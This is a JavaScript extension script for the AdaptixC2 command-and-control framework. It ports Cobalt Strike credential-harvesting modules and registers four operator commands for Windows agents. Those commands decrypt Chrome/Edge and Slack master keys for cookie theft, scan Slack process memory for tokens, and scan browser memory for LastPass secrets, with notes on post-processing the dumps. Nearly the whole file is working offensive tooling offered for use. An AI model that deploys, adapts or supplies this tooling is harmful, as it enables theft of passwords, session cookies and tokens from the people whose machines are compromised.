var metadata = {
    name: "CS-Creds-BOF",
    description: "Ported Cobalt Strike CS-Remote-OPs credential-harvest BOFs (prefix: cs_)"
};

/// COMMANDS
//
// Original CS -> Adaptix
//   chromeKey    -> cs_chromekey                        no args
//   slackKey     -> cs_slackkey                         no args
//   slack_cookie -> cs_slack_cookie   [PID]             pack "i" -> int
//   lastpass     -> cs_lastpass       [PID1] [PID2]...  pack "ib" -> int, bytes (array of DWORDs, null-terminated)
//
// NOTE about lastpass: the CS .cna paired the BOF with a Sleep event handler and
// a helper python script (process_lp_files.py) that:
//   * intercepts beacon_output messages with the "LASTPASS>>" tag,
//   * dumps them into per-PID files under the script's `lastpass/` directory,
//   * and, when the BOF sends a type=100 "done" tag, runs
//         python3 process_lp_files.py <lastpass_dir>
//     to combine everything into a single readable dump.
//
// AdaptixC2 does not expose the same beacon_output event stream to AxScript today,
// so the on-agent BOF still runs and prints its raw tagged output to the agent
// console. If you want the parsed decrypted output, run process_lp_files.py
// yourself against the copies you save. The helper script is included at
// _bin/process_lp_files.py.


// ---------- cs_chromekey ----------
var cmd_chromekey = ax.create_command(
    "cs_chromekey",
    "Decrypt the base64-encoded Chrome/Edge master key so it can be used with Chlonium against a downloaded Cookies file",
    "cs_chromekey"
);
cmd_chromekey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/chromeKey." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: cs_chromekey");
});


// ---------- cs_slackkey ----------
var cmd_slackkey = ax.create_command(
    "cs_slackkey",
    "Decrypt the base64-encoded Slack master key so it can be used against a downloaded Slack Cookies file",
    "cs_slackkey"
);
cmd_slackkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/slackKey." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "Task: cs_slackkey");
});


// ---------- cs_slack_cookie ----------
var cmd_slack_cookie = ax.create_command(
    "cs_slack_cookie",
    "Scan a target process's memory for Slack tokens",
    "cs_slack_cookie 1234"
);
cmd_slack_cookie.addArgInt("pid", true, "PID of the Slack process to scan");
cmd_slack_cookie.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let bof_params = ax.bof_pack("int", [pid]);
    let bof_path = ax.script_dir() + "_bin/slack_cookie." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_slack_cookie");
});


// ---------- cs_lastpass ----------
// The BOF expects: int arg_count, bytes payload
// where payload is arg_count DWORDs (target PIDs) followed by a terminating 0 DWORD.
var cmd_lastpass = ax.create_command(
    "cs_lastpass",
    "Scan memory of the given browser PIDs for LastPass secrets/hashes. Post-process output with _bin/process_lp_files.py.",
    "cs_lastpass 1234 5678 9012"
);
cmd_lastpass.addArgString("pids", true, "Space-separated list of PIDs to scan");
cmd_lastpass.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let raw = String(parsed_json["pids"] || "").trim();
    if (raw.length === 0) {
        ax.console_message(id, "cs_lastpass: need at least one PID\n", "error");
        return;
    }
    let pid_strs = raw.split(/\s+/);
    let pids = [];
    for (let s of pid_strs) {
        let n = parseInt(s);
        if (isNaN(n) || n <= 0) {
            ax.console_message(id, "cs_lastpass: invalid PID '" + s + "'\n", "error");
            return;
        }
        pids.push(n);
    }

    // build a raw byte string: each PID as 4-byte LE, then a terminating 0 DWORD
    let buf = "";
    for (let p of pids) {
        buf += String.fromCharCode(
            p & 0xff,
            (p >>> 8) & 0xff,
            (p >>> 16) & 0xff,
            (p >>> 24) & 0xff
        );
    }
    buf += "\x00\x00\x00\x00";

    // ax.bof_pack treats 'bytes' inputs as base64 (matching the Extension-Kit reference).
    // Encode our raw byte string to base64 before passing.
    let buf_b64 = _raw_to_b64(buf);

    let bof_params = ax.bof_pack("int,bytes", [pids.length, buf_b64]);
    let bof_path = ax.script_dir() + "_bin/lastpass." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`,
        "Task: cs_lastpass (" + pids.length + " PIDs) - post-process with _bin/process_lp_files.py");
});

// Raw byte string -> base64 (each JS charCode taken as a single byte 0..255)
function _raw_to_b64(bytes_str) {
    const ALPH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let out = "";
    let i = 0;
    let len = bytes_str.length;
    while (i < len) {
        let c1 = bytes_str.charCodeAt(i++) & 0xff;
        let c2 = (i < len) ? bytes_str.charCodeAt(i++) & 0xff : -1;
        let c3 = (i < len) ? bytes_str.charCodeAt(i++) & 0xff : -1;
        out += ALPH.charAt(c1 >> 2);
        out += ALPH.charAt(((c1 & 0x03) << 4) | ((c2 < 0 ? 0 : c2) >> 4));
        out += (c2 < 0) ? "=" : ALPH.charAt(((c2 & 0x0f) << 2) | ((c3 < 0 ? 0 : c3) >> 6));
        out += (c3 < 0) ? "=" : ALPH.charAt(c3 & 0x3f);
    }
    return out;
}


/// REGISTER GROUP

var group_cs_creds = ax.create_commands_group("CS-Creds-BOF", [
    cmd_chromekey,
    cmd_slackkey,
    cmd_slack_cookie,
    cmd_lastpass
]);
ax.register_commands_group(group_cs_creds, ["beacon", "gopher", "kharon"], ["windows"], []);
